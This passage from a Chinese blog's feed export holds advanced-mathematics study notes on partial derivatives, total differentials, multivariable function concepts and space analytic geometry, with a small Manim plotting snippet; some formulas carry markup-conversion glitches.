y^{3}-y,  \frac{\partial z}{\partial y}=2 x^{3} y-9 x y^{2}-x \&amp;\frac{\partial^{2} z}{\partial x^{2}}=6 x y^{2}, \frac{\partial^{2} z}{\partial y \partial x}=6 x^{2} y-9 y^{2}-1 \&amp;<br>\frac{\partial^{2} z}{\partial x \partial y}=6 x^{2} y-9 y^{2}-1,  \frac{\partial^{2} z}{\partial y^{2}}=2 x^{3}-18 x y \&amp;<br>\frac{\partial^{3} z}{\partial x^{3}}=6 y^{2}<br>\end{align}$</p><hr><p>验证函数$z=\ln \sqrt{x^{2}+y^{2}}$，满足方程$\frac{\partial^{2} z}{\partial x^{2}}+\frac{\partial^{2} z}{\partial y^{2}}=0 $</p><p>因为$z=\ln \sqrt{x^{2}+y^{2}}=\frac{1}{2} \ln \left(x^{2}+y^{2}\right)$，所以</p><p>$\begin{align}<br>&amp;\frac{\partial z}{\partial x}=\frac{x}{x^{2}+y^{2}}, \quad \frac{\partial z}{\partial y}=\frac{y}{x^{2}+y^{2}} \<br>&amp;\frac{\partial^{2} z}{\partial x^{2}}=\frac{\left(x^{2}+y^{2}\right)-x \cdot 2 x}{\left(x^{2}+y^{2}\right)^{2}}=\frac{y^{2}-x^{2}}{\left(x^{2}+y^{2}\right)^{2}} \&amp;<br>\frac{\partial^{2} z}{\partial y^{2}}=\frac{\left(x^{2}+y^{2}\right)-y \cdot 2 y}{\left(x^{2}+y^{2}\right)^{2}}=\frac{x^{2}-y^{2}}{\left(x^{2}+y^{2}\right)^{2}}<br>\end{align}$</p><p>因此</p><p>$\begin{align}\frac{\partial^{2} z}{\partial x^{2}}+\frac{\partial^{2} z}{\partial y^{2}}=\frac{y^{2}-x^{2}}{\left(x^{2}+y^{2}\right)^{2}}+\frac{x^{2}-y^{2}}{\left(x^{2}+y^{2}\right)^{2}}=0\end{align}$</p><h2 id="全微分"><a href="#全微分" class="headerlink" title="全微分"></a>全微分</h2><p>以上关于二元函数全微分的定义及可微分的必要条件和充分条件，可以完全类似地推广到三元和三元以上的多元函数。<br>习惯上，我们将自变量的增量$\Delta x$与$\Delta y$分别记作$\mathrm{d} x$与$\mathrm{d} y$，并分别称为自变量$x$与$y$的微分。这样, 函数$z=f(x, y)$的全微分就可写为</p><p>$\begin{align}\mathrm{d} z=\frac{\partial z}{\partial x} \mathrm{~d} x+\frac{\partial z}{\partial y} \mathrm{~d} y\end{align}$</p><p>通常把二元函数的全微分等于它的两个偏微分之和这件事称为二元函数的微分符合叠加原理。<br>叠加原理也适用于二元以上的函数.。例如，如果三元函数$u=f(x, y, z)$可微分，那么它的全微分就等于它的三个偏微分之和，即</p><p>$\begin{align}\mathrm{d} u=\frac{\partial u}{\partial x} \mathrm{~d} x+\frac{\partial u}{\partial y} \mathrm{~d} y+\frac{\partial u}{\partial z} \mathrm{~d} z\end{align}$</p><h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><p>计算函数$z=x^{2} y+y^{2}$的全微分</p><p>因为</p><p>$\begin{align}\frac{\partial z}{\partial x}=2 x y, \frac{\partial z}{\partial y}=x^{2}+2 y\end{align}$</p><p>所以</p><p>$\begin{align}\mathrm{d} z=2 x y \mathrm{~d} x+\left(x^{2}+2 y\right) \mathrm{d} y\end{align}$</p><hr><p>计算函数$z=\mathrm{e}^{x y}$在点$(2,1)$处的全微分</p><p>因为</p><p>$\begin{align}\frac{\partial z}{\partial x}=y \mathrm{e}^{x y}, \frac{\partial z}{\partial y}=x \mathrm{e}^{x y} ;\left.\frac{\partial z}{\partial x}\right|<em>{\substack{x=2 \ y=1}}=\mathrm{e}^{2},\left.\frac{\partial z}{\partial y}\right|</em>{\substack{x=2 \ y=1}}=2 \mathrm{e}^{2}\end{align}$</p><p>所以</p><p>$\begin{align}\left.\mathrm{d} z\right|_{\substack{x=2 \ y=1}}=\mathrm{e}^{2} \mathrm{~d} x+2 \mathrm{e}^{2} \mathrm{~d} y\end{align}$</p><hr><p>计算函数$u=x+\sin \frac{y}{2}+\mathrm{e}^{y z}$的全微分</p><p>因为</p><p>$\begin{align}\frac{\partial u}{\partial x}=1, \frac{\partial u}{\partial y}=\frac{1}{2} \cos \frac{y}{2}+z \mathrm{e}^{y z}, \frac{\partial u}{\partial z}=y \mathrm{e}^{y z}\end{align}$</p><p>所以</p><p>$\begin{align}\mathrm{d} u=\mathrm{d} x+\left(\frac{1}{2} \cos \frac{y}{2}+z \mathrm{e}^{y z}\right) \mathrm{d} y+y \mathrm{e}^{y z} \mathrm{~d} z\end{align}$</p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="高等数学" scheme="https://www.ascotbe.com/categories/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="高数" scheme="https://www.ascotbe.com/tags/%E9%AB%98%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>多元函数的基本概念</title>
    <link href="https://www.ascotbe.com/2023/05/24/FurtherMathematics_0xB/"/>
    <id>https://www.ascotbe.com/2023/05/24/FurtherMathematics_0xB/</id>
    <published>2023-05-24T15:58:53.000Z</published>
    <updated>2023-06-11T15:38:56.473Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/0_B.gif" alt="d"></p><h3 id="平面点集"><a href="#平面点集" class="headerlink" title="平面点集"></a>平面点集</h3><h4 id="坐标平面"><a href="#坐标平面" class="headerlink" title="坐标平面"></a>坐标平面</h4><p>当在平面上引人了一个直角坐标系后，平面上的点$P$与有序二元实数组$(x,y)$之间就建立了一一对应。于是，<strong>我们常把有序实数组$(x,y)$与平面上的点$P$视作是等同的</strong>。这种建立了坐标系的平而称为坐标平面。二元有序实数组$(x,y)$的全体，$R^{2}=R \times R={(x, y) \mid x, y \in R}$即就表示坐标平面。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from manim import *</span><br><span class="line"></span><br><span class="line">class NumberPlaneWithPoint(Scene):</span><br><span class="line">    def construct(self):</span><br><span class="line">        # 创建坐标系</span><br><span class="line">        axes = Axes(</span><br><span class="line">            x_range=(-5, 5),</span><br><span class="line">            y_range=(-5, 5),</span><br><span class="line">            x_length=10,</span><br><span class="line">            y_length=10,</span><br><span class="line">            x_axis_config=&#123;</span><br><span class="line">                &quot;include_numbers&quot;: True,</span><br><span class="line">                &quot;numbers_to_include&quot;: [-4, -2, 2, 4],</span><br><span class="line">                &quot;color&quot;: BLUE,</span><br><span class="line">            &#125;,</span><br><span class="line">            y_axis_config=&#123;</span><br><span class="line">                &quot;include_numbers&quot;: True,</span><br><span class="line">                &quot;numbers_to_include&quot;: [-4, -2, 2, 4],</span><br><span class="line">                &quot;color&quot;: BLUE,</span><br><span class="line">            &#125;,</span><br><span class="line">            tips=False,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        # 创建点P</span><br><span class="line">        x = 2</span><br><span class="line">        y = 3</span><br><span class="line">        point = Dot(axes.c2p(x, y), color=RED)</span><br><span class="line">        label = MathTex(f&quot;P=(&#123;x&#125;, &#123;y&#125;)&quot;).next_to(point, DOWN)</span><br><span class="line"></span><br><span class="line">        self.add(axes)</span><br><span class="line">        self.play(Create(point), Write(label))</span><br><span class="line">        self.wait()</span><br></pre></td></tr></table></figure><p>下图的点请脑补为$P=(x,y)$</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/75.gif" alt="NumberPlaneWithPoint_ManimCE_v0.17.3"></p><h4 id="平面点集-1"><a href="#平面点集-1" class="headerlink" title="平面点集"></a>平面点集</h4><p>坐标平面上具有某种性质$P$的点的集合，称为平面点集。</p><p>例如，平面上以原点为中心，$r$为半径的圆内所有点的集合是</p><p>$\begin{align}C={(x,y)|x^2+y^2&lt;r^2}\end{align}$</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/76.png" alt="2"></p><h4 id="领域"><a href="#领域" class="headerlink" title="领域"></a>领域</h4><p>设$P<em>{0}\left(x</em>{0}, y<em>{0}\right)$是$x O y$平面上的一个点，是某一正数。与点$P</em>{0}\left(x<em>{0}, y</em>{0}\right)$距离小于$\delta$的点$P(x, y)$的全体，称为点 $P<em>{0}$的$\delta$邻域，记作$U\left(P</em>{0}, \delta\right)$，即</p><p>$\begin{align}U\left(P<em>{0}, \delta\right)=\left{P|\mid P P</em>{0} \mid&lt;\delta\right}\end{align}$</p><p>也就是</p><p>$\begin{align}U\left(P<em>{0}, \delta\right)=\left{(x, y) \mid \sqrt{\left(x-x</em>{0}\right)^{2}+\left(y-y_{0}\right)^{2}}&lt;\delta\right}\end{align}$</p><p>点$P<em>{0}$的去心$\delta$邻域，记作$\stackrel{\circ}{U}\left(P</em>{0}, \delta\right)$，即</p><p>$\begin{align}\stackrel{\circ}{U}\left(P<em>{0}, \delta\right)=\left{P|0&lt;| P P</em>{0} \mid&lt;\delta\right}\end{align}$</p><p>在几何上，$U\left(P<em>{0}, \delta\right)$就是$xOy$平面上以点$P</em>{0}\left(x<em>{0}, y</em>{0}\right)$为中心，$\delta&gt;0$为半径的圆内部点$P(x, y)$的全体</p><h4 id="点集直接的关系"><a href="#点集直接的关系" class="headerlink" title="点集直接的关系"></a>点集直接的关系</h4><p>任意一点$P\in R^{2}$与任意一个点集$E\subset R^{2}$之间必有以下三种关系中的一种：</p><ol><li><p>内点：如果存在点$P$的某个邻域$U(P)$，使得$U(P)\subset E$,那么称$P$为$E$的内点</p></li><li><p>外点：如果存在点$P$的某个邻域$U(P)$，使得$U(P)\cap E=\varnothing$，那么称$P$为$E$的外点</p></li><li><p>边界点：如果点$P$的任一邻域内既含有属于$E$的点，又含有不属于$E$的点,那么称$P$为$E$的边界点</p></li><li><p>聚点:如果对于任意给定的$\delta&gt;0$，点$P$的去心邻域$\stackrel{\circ}{U}(P,\delta)$内总有$E$中的点,那么称$P$是$E$的聚点。</p><p>由聚点的定义可知，点集$E$的聚点$P$本身，可以属于$E$，也可以不属于$E$。</p><p>例如，设平面点集</p><p>$\begin{align}E=\left{(x,y)\mid1&lt;x^{2}+y^{2}\leqslant2\right}\end{align}$</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/77.png" alt="image-20230607141422225" style="zoom:33%;" /></p><p>满足$1&lt;x^{2}+y^{2}&lt;2$的一切点$(x,y)$都是$E$的内点；满足$x^{2}+y^{2}=1$的一切点$(x,y)$都是$E$的边界点,它们都不属于$E$；满足$x^{2}+y^{2}=2$的一切点$(x,y)$也是$E$的边界点,它们都属于$E$；点集$E$以及它的边界$\partial E$上的一切点都是$E$的聚点。</p></li></ol><p>$E$的边界点的全体，称为$E$的边界，记作$\partial E$</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/78.png" alt="image-20230606223243738" style="zoom:50%;" /></p><p><strong>开集与闭集</strong></p><p>虚线表示不属于该点集，实现表示属于该点集</p><p>如果点集$E$的点都是内点，那么称$E$为<strong>开集</strong></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/79.png" alt="开集" style="zoom:50%;" style="float:left;" /></p><p>如果点集$E$的边界点都属于$E$，则称$E$为<strong>闭集</strong></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/80.png" alt="闭集" style="zoom:50%;" /></p><p><strong>连通集</strong></p><p>如果点集$E$内任意两点都可用折线链接起来，且该折线上的点都属于$E$，则称$E$为<strong>连通集</strong></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/81.png" alt="连通集" style="zoom:50%;" /></p><p>非连通集</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/82.png" alt="非连通集" style="zoom:50%;" /></p><p><strong>开区域与闭区域</strong></p><p>连通的开集称为<strong>开区域</strong>或者<strong>闭区域</strong></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/83.png" alt="开区域" style="zoom:50%;" /></p><p>开区域连同它的边界一起构成的点集称为<strong>闭区域</strong></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/84.png" alt="闭区域" style="zoom:50%;" /></p><p>相关关系解释</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/85.png" alt="img"></p><h3 id="多远函数的概念"><a href="#多远函数的概念" class="headerlink" title="多远函数的概念"></a>多远函数的概念</h3><h4 id="二元函数"><a href="#二元函数" class="headerlink" title="二元函数"></a>二元函数</h4><p>例子：圆柱体的体积$V$和它的底半径$r$、高$h$之间具有关系</p><p>$V=\pi r^{2}h$</p><p>这里，当$r$和$h$在集合${(r,h)|r&gt;0,h&gt;0}$内取定一对值$\left(r,h\right)$时，$V$的对应值就随之确定，那么由该例子可以得到定义</p><p>定义：设$D$是$R^2$的一个非空子集，称$f:D\to\mathbf{R}$映射为定义在$D$上的二元函数，通常记为$z=f\left(x,y\right),\left(x,y\right)\in D$</p><p>或</p><p>$\begin{align}z=f(P),P\in D\end{align}$</p><p>其中点集$D$称为该函数的定义域，$x$和$y$称为自变量，$z$称为因变量</p><p>值域为</p><p>$\begin{align}f(D)={z|z=f(x,y),(x,y)\in D}\end{align}$</p><h4 id="N元函数"><a href="#N元函数" class="headerlink" title="N元函数"></a>N元函数</h4><p>把二元函数的定义套上来即可得到n元函数的公式</p><p>$\begin{align}u=f(x_1,x_2,\cdots,x_n),(x_1,x_2,\cdots,x_n)\in D\end{align}$</p><p>或者简记为</p><p>$\begin{align}u=f(\boldsymbol{x}),\boldsymbol{x}=(\boldsymbol{x}_1,x_2,\cdots,x_n)\in D\end{align}$</p><p>也可以记为</p><p>$\begin{align}u=f(P),P(x_1,x_2,\cdots,x_n)\in D\end{align}$</p><h4 id="二元函数的极限"><a href="#二元函数的极限" class="headerlink" title="二元函数的极限"></a>二元函数的极限</h4><p>设二元函数$f(x,y)$的定义域为$D$，$P_0(x_0,y_0)$，对于任意给定的正数$\epsilon$，总存在正数$\delta$，使得当点$P(x,y)$满足下列条件时：</p><p>$\begin{align}(x,y)\in D\cap \mathring{U}(P_0,\delta)\end{align}$</p><p>都有：</p><p>$\begin{align}|f(x,y)-L| &lt; \epsilon\end{align}$</p><p>成立，那么就称常数$L$为函数$f(x,y)$当$(x,y)\to(x_0,y_0)$时的极限，记作：</p><p>$\begin{align}\lim_{(x,y)\to(x_0,y_0)}f(x,y)=L\quad or \quad f(x,y)\to L\ \big(\ (x,y)\to(x_0,y_0)\ \big)\end{align}$</p><p>因为这是二元函数的极限，所以也称作<strong>二重极限</strong>。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/87.png" alt="下载"></p><p>例题：求$\lim_{(x,y)\rightarrow(0,2)}\frac{\sin(x y)}{x}\quad$</p><p>$\begin{align}\lim<em>{(x,y)\rightarrow(0,2)}\frac{\sin(x y)}{x}\quad&amp;\=\lim</em>{(x,y)\rightarrow(0,2)} \frac{\sin(x y)}{x y} \cdot y&amp;\=\lim<em>{x y\to0}\frac{\sin(x y)}{x y}\cdot\lim</em>{y\to2}y&amp;\=1\cdot 2=2\end{align}$</p><h4 id="二元函数的连续性"><a href="#二元函数的连续性" class="headerlink" title="二元函数的连续性"></a>二元函数的连续性</h4><p>设二元函数$f(x,y)$的定义域为$D$，$P_0(x_0,y_0)$是的聚$D$点</p><ul><li><p>连续</p><p>$\begin{align}P<em>0\in D \ \ \lim </em>{(x, y) \rightarrow\left(x<em>{0}, y</em>{0}\right)} f(x, y)=f\left(x<em>{0}, y</em>{0}\right)\end{align}$</p><p>那么称函数$f(x,y)$在点$P_0(x_0,y_0)$<strong>连续</strong>。</p></li><li><p>间断</p><p>如果函数$f(x,y)$在点$P_0(x_0,y_0)$不连续，那么称$P_0(x_0,y_0)$为函数$f(x,y)$的<strong>间断点</strong></p></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="高等数学" scheme="https://www.ascotbe.com/categories/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="高数" scheme="https://www.ascotbe.com/tags/%E9%AB%98%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>空间几何及其方程</title>
    <link href="https://www.ascotbe.com/2023/04/17/FurtherMathematics_0xA/"/>
    <id>https://www.ascotbe.com/2023/04/17/FurtherMathematics_0xA/</id>
    <published>2023-04-17T15:58:53.000Z</published>
    <updated>2023-06-11T09:33:08.533Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/0_A.png" alt="9642213f87b8885725e2cdcaa456826f" style="zoom:50%;" /></p><h2 id="空间平面与直线"><a href="#空间平面与直线" class="headerlink" title="空间平面与直线"></a>空间平面与直线</h2><h3 id="空间平面及其方程"><a href="#空间平面及其方程" class="headerlink" title="空间平面及其方程"></a>空间平面及其方程</h3><h4 id="点法式方程"><a href="#点法式方程" class="headerlink" title="点法式方程"></a>点法式方程</h4><p>已知平面$\Pi$上一点$M<em>{0}\left(x</em>{0}, y<em>{0}, z</em>{0}\right)$及与该平面垂直的非零向量$\vec{n}=(A, B, C)$它称为该平面的法向量。法向量在这个平面上是无穷多个的</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/62.png" alt="image-20230505180915325" style="zoom:25%;" /></p><p>$M_0(x_0, y_0, z_0)$是平面$\Pi$上的一个定点， 且已知该平面的法向量$\mathbf{n} = (A, B, C)$，对于平面上任一点$M(x, y, z)$，由于向量$\overrightarrow{M_0M} = (x - x_0, y - y_0, z - z_0)$必与平面$\Pi$的法向量$\mathbf{n}$垂直，于是有$\overrightarrow{M_0M} · \mathbf{n} = 0$，即</p><p>$\begin{align}A(x - x_0) + B(y - y_0) + C(z - z_0) = 0\end{align}$</p><h4 id="一般方程"><a href="#一般方程" class="headerlink" title="一般方程"></a>一般方程</h4><p>将平面的点法式方程展开，我们就得到平面的<strong>一般式方程</strong>。任一平面的方程都是三元一次方程</p><p>$\begin{align}<br>A\left(x-x<em>{0}\right)+B\left(y-y</em>{0}\right)+C\left(z-z<em>{0}\right) &amp; =0 \<br>A x+B y+C z+\underbrace{\left(-A x</em>{0}-B y<em>{0}-C z</em>{0}\right)}_{D} &amp; =0 \<br>A x+B y+C z+D &amp; =0<br>\end{align}$</p><p>这里列出几个特殊的平面方程。</p><ol><li>当$D = 0$时，$Ax+By+Cz = 0$，原点$O(0, 0, 0)$的坐标满足此方程，表示过原点的平面。</li><li>当$A = 0$时，平面$By+Cz+D=0$，法向量为$\vec n=(0, B,C)$，垂直于$x$轴， 所以该平面与$x$轴平行。<br>当$B = 0$时，平面$Ax+Cz+D=0$，法向量为$\vec n=(A, 0,C)$，垂直于$y$轴， 所以该平面与$y$轴平行。<br>当$C = 0$时，平面$Ax+By+D=0$，法向量为$\vec n=(A, B,0)$，垂直于$z$轴， 所以该平面与$z$轴平行。</li><li>当$A = B = 0$时， 平面$Cz+D=0$，法向量为$\vec n=(0, 0,C)$在$x$轴和$y$轴上的投影都为零， 故与$x$轴和$y$轴都垂直， 即与$xOy$面垂直， 平面平行于$xOy$面<br>$B = C = 0$平面$Ax + D = 0]$表示与$yOz$面平行<br>$A = C = 0$平面$Bx + D = 0$表示与$zOx$面平行</li></ol><div class="table-container"><table><thead><tr><th style="text-align:left">平面与坐标轴位置关系</th><th style="text-align:left">平面方程</th></tr></thead><tbody><tr><td style="text-align:left">过原点$(0,0,0)$</td><td style="text-align:left">$D=0$</td></tr><tr><td style="text-align:left">平行$x$轴</td><td style="text-align:left">$A=0$</td></tr><tr><td style="text-align:left">平行$y$轴</td><td style="text-align:left">$B=0$</td></tr><tr><td style="text-align:left">平行$z$轴</td><td style="text-align:left">$C=0$</td></tr><tr><td style="text-align:left">过$x$轴</td><td style="text-align:left">$A=0,D=0$</td></tr><tr><td style="text-align:left">过$y$轴</td><td style="text-align:left">$B=0,D=0$</td></tr><tr><td style="text-align:left">过$z$轴</td><td style="text-align:left">$C=0,D=0$</td></tr></tbody></table></div><h4 id="截距式方程"><a href="#截距式方程" class="headerlink" title="截距式方程"></a>截距式方程</h4><p>平面的另一种表示形式是<strong>截距式方程</strong>，它表示出平面在三个坐标轴上的截距，对于作图会有帮助，平面的截距式方程也很容易改写成一般式方程。 a、b 和 c 叫作该平面的截距。</p><p>$\begin{align}<br>\frac{x}{a}+\frac{y}{b}+\frac{z}{c} &amp; =1 \<br>\frac{1}{a} x+\frac{1}{b} y+\frac{1}{c} z-1 &amp; =0<br>\end{align}$</p><h4 id="两平面的夹角"><a href="#两平面的夹角" class="headerlink" title="两平面的夹角"></a>两平面的夹角</h4><p>两平面法向量的夹角 (常为锐角) 称为两平面的夹角。 </p><p>设平面$\prod<em>{1}$的法向量为$\vec{n}</em>{1}=\left(A<em>{1}, B</em>{1}, C<em>{1}\right)$ ，平面$\prod</em>{2}$的法向量为$\vec{n}<em>{2}=\left(A</em>{2}, B<em>{2}, C</em>{2}\right)$ </p><p>则两平面夹角$\theta$的余弦为</p><p>$\begin{align}\cos \theta=\frac{\left|\mathbf{\vec n}<em>{\mathbf{1}} \cdot \mathbf{\vec n}</em>{\mathbf{2}}\right|}{\left|\mathbf{\vec n}<em>{\mathbf{1}}\right|\left|\mathbf{\vec n}</em>{\mathbf{2}}\right|}=\frac{\left|A<em>{1} A</em>{2}+B<em>{1} B</em>{2}+C<em>{1} C</em>{2}\right|}{\sqrt{A<em>{1}^{2}+B</em>{1}^{2}+C<em>{2}^{2}} \sqrt{A</em>{2}^{2}+B<em>{2}^{2}+C</em>{2}^{2}}}\end{align}$</p><p>特殊的：</p><ul><li><p>$\prod<em>{1} \perp \prod</em>{2}$(两平面互相垂直) 的充要条件是</p><p>$A<em>{1} A</em>{2}+B<em>{1} B</em>{2}+C<em>{1} C</em>{2}=0$</p></li><li><p>$\prod<em>{1} / / \prod</em>{2}$(两平面互相平行) 的充要条件是</p><p>$\frac{A<em>{1}}{A</em>{2}}=\frac{B<em>{1}}{B</em>{2}}=\frac{C<em>{1}}{C</em>{2}}$</p></li><li><p>$\prod<em>{1}$与$\prod</em>{2}$重合的充要条件是</p><p>$\frac{A<em>{1}}{A</em>{2}}=\frac{B<em>{1}}{B</em>{2}}=\frac{C<em>{1}}{C</em>{2}}=\frac{D<em>{1}}{D</em>{2}}$</p></li></ul><h4 id="点到平面的距离"><a href="#点到平面的距离" class="headerlink" title="点到平面的距离"></a>点到平面的距离</h4><p>平面的一般方程：$A x+B y+C z+D =0$</p><p>点：$P(x_0,y_0,z_0)$</p><p>点到屏幕距离$d$的公式：</p><p>$\begin{align}d=\frac{\left|Ax_0+By_0+Cz_0+D\right|}{\sqrt{A^{2}+B^{2}+C^{2}} }\end{align}$</p><h3 id="直线及其方程"><a href="#直线及其方程" class="headerlink" title="直线及其方程"></a>直线及其方程</h3><h4 id="一般方程-1"><a href="#一般方程-1" class="headerlink" title="一般方程"></a>一般方程</h4><p>任一空间直线$L$都可以看作是两个相交平面的交线</p><p>若平面$\Pi_1$的方程为$A_1x +B_1y +C_1z +D_1 = 0$，平面 $\Pi_2$的方程为$A_2x +B_2y +C_2z +D_2 = 0$，则方程组</p><p>$\begin{align}\begin{cases} A_1x +B_1y +C_1z +D_1 = 0 \ A_2x +B_2y +C_2z +D_2 = 0 \end{cases}\end{align}$</p><p>表示空间直线$L$的方程， 称为空间直线的<strong>一般方程</strong>。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/63.png" alt="img"></p><h4 id="参数式方程"><a href="#参数式方程" class="headerlink" title="参数式方程"></a>参数式方程</h4><p>方向向量的定义</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/64.png" alt="image-20230505152307802" style="zoom:23%;" /></p><p>设直线上$L$过点$M_0(x_0, y_0, z_0)$且与向量$\vec s = (l, m, n)$平行， 称$\vec s$为$L$的<strong>方向向量</strong>，$l,m,n$称为<strong>方向数</strong>。</p><p>下面求直线$L$的方程</p><p>设$M(x,y, z)$为直线$L$上任意一点， 则$\overrightarrow{M_0M} / / \mathbf{\vec s}$， 所以$\overrightarrow{M_0M} =t \mathbf{\vec s}$（t为实数），$(x-x_0,y-y_0,z-z_0)=t(l,m,n)$，则有直线的<strong>参数式方程</strong></p><p>$\begin{align}\begin{cases} x = x_0 + lt \ y = y_0 + mt\ z = z_0 +nt\end{cases}\end{align}$</p><h4 id="对称式方程（点向式方程）"><a href="#对称式方程（点向式方程）" class="headerlink" title="对称式方程（点向式方程）"></a>对称式方程（点向式方程）</h4><p>根据参数方程得出来</p><p>$\begin{align}t=\frac{x - x_0}{l} =\frac{y - y_0}{m} =\frac{z-z_0}{n}\end{align}$</p><p>所以下列方程就是直线$L$的<strong>对称方程</strong>或者$L$的<strong>点向式方程</strong></p><p>$\begin{align}\frac{x - x_0}{l} =\frac{y - y_0}{m} =\frac{z-z_0}{n}\end{align}$</p><div class="note info modern"><p>若有某个分母为零，应该理解为其相应的分子等于零。</p></div><p>比如：若$m=0$，则$y-y_0=0$，直线$L$的方程为两个平面的交线</p><p>$\begin{align}\begin{cases}\frac{x - x_0}{l}  =\frac{z-z_0}{n}\y-y_0=0\end{cases}\end{align}$</p><h4 id="两直线的夹角"><a href="#两直线的夹角" class="headerlink" title="两直线的夹角"></a>两直线的夹角</h4><p>定义：两直线的方向向量的夹角称之为两直线的夹角。（锐角）</p><p>直线$L<em>{1}$：$\frac{x-x</em>{1}}{m<em>{1}}=\frac{y-y</em>{1}}{n<em>{1}}=\frac{z-z</em>{1}}{p_{1}}$</p><p>直线$L<em>{2}$：$\frac{x-x</em>{2}}{m<em>{2}}=\frac{y-y</em>{2}}{n<em>{2}}=\frac{z-z</em>{2}}{p_{2}}$</p><p>$\begin{align}\cos \left(\widehat{L<em>{1}, L</em>{2}}\right)=\frac{\left|m<em>{1} m</em>{2}+n<em>{1} n</em>{2}+p<em>{1} p</em>{2}\right|}{\sqrt{m<em>{1}^{2}+n</em>{1}^{2}+p<em>{1}^{2}} \cdot \sqrt{m</em>{2}^{2}+n<em>{2}^{2}+p</em>{2}^{2}}}\end{align}$</p><p>两直线的位置关系</p><ol><li>$l_1 / / l_2$时，$\frac{m_1}{m_2} =\frac{n_1}{n_2} =\frac{p_1}{p_2}$</li><li>$l_1\bot l_2$时， $m_1m_2 +n_1n_2 +p_1p_2 = 0$</li></ol><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/65.png" alt="img"></p><h4 id="直线与平面的夹角"><a href="#直线与平面的夹角" class="headerlink" title="直线与平面的夹角"></a>直线与平面的夹角</h4><p>直线$L$和它在平面$\pi$上的投影直线所构成的角称为该直线与平面的夹角， 记为</p><p>$\begin{align}\varphi (0 ≤ \varphi  &lt; \frac{\pi} {2})\end{align}$</p><p>当直线与平面垂直时， 规定$\varphi  = \frac{\pi} {2}$</p><p>设直线$L:\frac{x - x_0}{0} =\frac{y - y_0}{n} =\frac{z-z_0}{p} ,\mathbf{s} = (m, n, p)$</p><p>平面$\Pi:Ax+By+Cz+D=0, \mathbf{n} = (A,B,C)$，则 $\varphi  = |\frac{\pi} {2} -\widehat{(\mathbf{s},\mathbf{n})}|$</p><p>$\begin{align}\sin \varphi  = |\cos \widehat{(\mathbf{s}，\mathbf{n})}| = \frac{|Am + Bn + Cp|}{\sqrt{A^2 + B^2 + C^2} \sqrt{m^2 + n^2 + p^2}}\end{align}$</p><p>当 $L/ / \Pi$ 时，$\mathbf{\vec s \perp  n }$， 即有$Am + Bn + Cp = 0$</p><p>当$L \perp  \Pi$时，$\mathbf{\vec s / / n }$， 即有$\frac{A}{m} =\frac{B}{n} =\frac{C}{p}$</p><h2 id="曲面与空间曲线"><a href="#曲面与空间曲线" class="headerlink" title="曲面与空间曲线"></a>曲面与空间曲线</h2><h3 id="空间的曲面"><a href="#空间的曲面" class="headerlink" title="空间的曲面"></a>空间的曲面</h3><p>曲面的实例：水桶的表面、台灯的罩子面等。</p><p>曲面在空间解析几何中被看成是点的几何轨迹。</p><p>引例：求到两定点$A(1,2,3)$和$B(2,-1,4)$等距离的点的轨迹方程。</p><p>解：设轨迹上的动点为$M(\boldsymbol{x}, \boldsymbol{y}, \boldsymbol{z})$则$|A M|=|B M|$, 即</p><p>$\begin{align}\sqrt{(x-1)^{2}+(y-2)^{2}+(z-3)^{2} }  =\sqrt{(x-2)^{2}+(y+1)^{2}+(z-4)^{2}}\end{align}$</p><p>化简得$2 x-6 y+2 z-7=0$</p><h3 id="常见的曲面"><a href="#常见的曲面" class="headerlink" title="常见的曲面"></a>常见的曲面</h3><h4 id="球面"><a href="#球面" class="headerlink" title="球面"></a>球面</h4><p>求动点到定点$M<em>{0}\left(x</em>{0}, y<em>{0}, z</em>{0}\right)$距离为$R$的轨迹方程。</p><p>解：设轨迹上动点为$M(x, \boldsymbol{y}, \boldsymbol{z})$依题意$\left|M_{0} M\right|=R$，即</p><p>$\begin{align}\sqrt{\left(x-x<em>{0}\right)^{2}+\left(y-y</em>{0}\right)^{2}+\left(z-z_{0}\right)^{2}}=R\end{align}$</p><p>故所求方程为$\left(x-x<em>{0}\right)^{2}+\left(y-y</em>{0}\right)^{2}+\left(z-z_{0}\right)^{2}=R^{2}$</p><p>特别地, 当$M_{0}$在原点时, 球面方程为</p><p>$\begin{align}x^{2}+y^{2}+z^{2}=R^{2}\end{align}$ </p><p>$z= \pm \sqrt{R^{2}-x^{2}-y^{2}}$表示上(下)球面</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/66.png" alt="马同学高等数学"></p><h4 id="旋转曲面"><a 